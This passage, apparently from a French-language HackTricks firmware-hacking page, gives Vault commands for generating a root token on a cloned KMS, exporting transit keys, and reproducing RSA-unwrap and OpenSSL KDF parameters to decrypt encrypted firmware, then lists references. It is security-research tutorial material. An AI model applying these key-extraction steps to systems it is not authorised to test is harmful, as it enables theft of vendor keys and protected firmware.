vault operator unseal <share3>

OTP=$(vault operator generate-root -generate-otp)
INIT=$(vault operator generate-root -init -otp="$OTP" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
NONCE=$(printf '%s\n' "$INIT" | awk '/Nonce/ {print $2}')
vault operator generate-root -nonce="$NONCE" "<share1>"
vault operator generate-root -nonce="$NONCE" "<share2>"
FINAL=$(vault operator generate-root -nonce="$NONCE" "<share3>" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
TOKEN=$(vault operator generate-root -decode="$(printf '%s\n' "$FINAL" | awk '/Root Token/ {print $3}')" -otp="$OTP")
```
Avec root sur le KMS cloné :

- Rendez les clés de transit exportables uniquement à l'intérieur du clone isolé : `vault write transit/keys/<name>/config exportable=true`
- Exportez la clé unwrap : `vault read transit/export/encryption-key/<name>`
- Testez la clé RSA récupérée avec la paire padding/hash exacte utilisée par le KMS. Un échec du déchiffrement PKCS#1 v1.5 et un échec du déchiffrement OAEP par défaut ne **prouvent** pas que la clé est incorrecte ; de nombreux flux basés sur Vault utilisent OAEP avec SHA-256, alors que les bibliothèques courantes utilisent SHA-1 par défaut.
- Si le payload commence par `Salted__`, reproduisez exactement le KDF OpenSSL du fournisseur (`EVP_BytesToKey`, souvent MD5 sur les appliances legacy) avant de tenter le déchiffrement AES-CBC.

Cela transforme le problème du « firmware chiffré » en un problème plus général : **récupérer les clés opérationnelles côté appliance, puis reproduire exactement hors ligne les paramètres unwrap + KDF**.

## Formation et certifications

- [https://www.attify-store.com/products/offensive-iot-exploitation](https://www.attify-store.com/products/offensive-iot-exploitation)

## References

- [1] [Cracking du firmware avec Claude : compétence de niveau senior, autonomie de niveau junior](https://bishopfox.com/blog/cracking-firmware-with-claude-senior-level-skill-junior-level-autonomy)
- [2] [Méthodologie de test de sécurité du firmware](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [3] [Practical IoT Hacking : le guide définitif pour attaquer l'Internet des objets](https://www.amazon.co.uk/Practical-IoT-Hacking-F-Chantzis/dp/1718500904)
- [4] [Exploiter des zero days sur du matériel abandonné – blog de Trail of Bits](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
- [5] [Comment un appareil connecté à 20 $ m'a donné accès à votre domicile](https://bishopfox.com/blog/how-a-20-smart-device-gave-me-access-to-your-home)
- [6] [Maintenant vous voyez mi : maintenant vous êtes pwned](https://labs.taszk.io/articles/post/nowyouseemi/)
- [7] [Synacktiv - Exploiter le Tesla Wall Connector depuis son connecteur de port de charge - Partie 2 : contourner l'anti-downgrade](https://www.synacktiv.com/en/publications/exploiting-the-tesla-wall-connector-from-its-charge-port-connector-part-2-bypassing)
- [8] [Make it Blink : exploitation over-the-air du Philips Hue Bridge](https://www.synacktiv.com/en/publications/make-it-blink-over-the-air-exploitation-of-the-philips-hue-bridge.html)
{{#include ../../banners/hacktricks-training.md}}
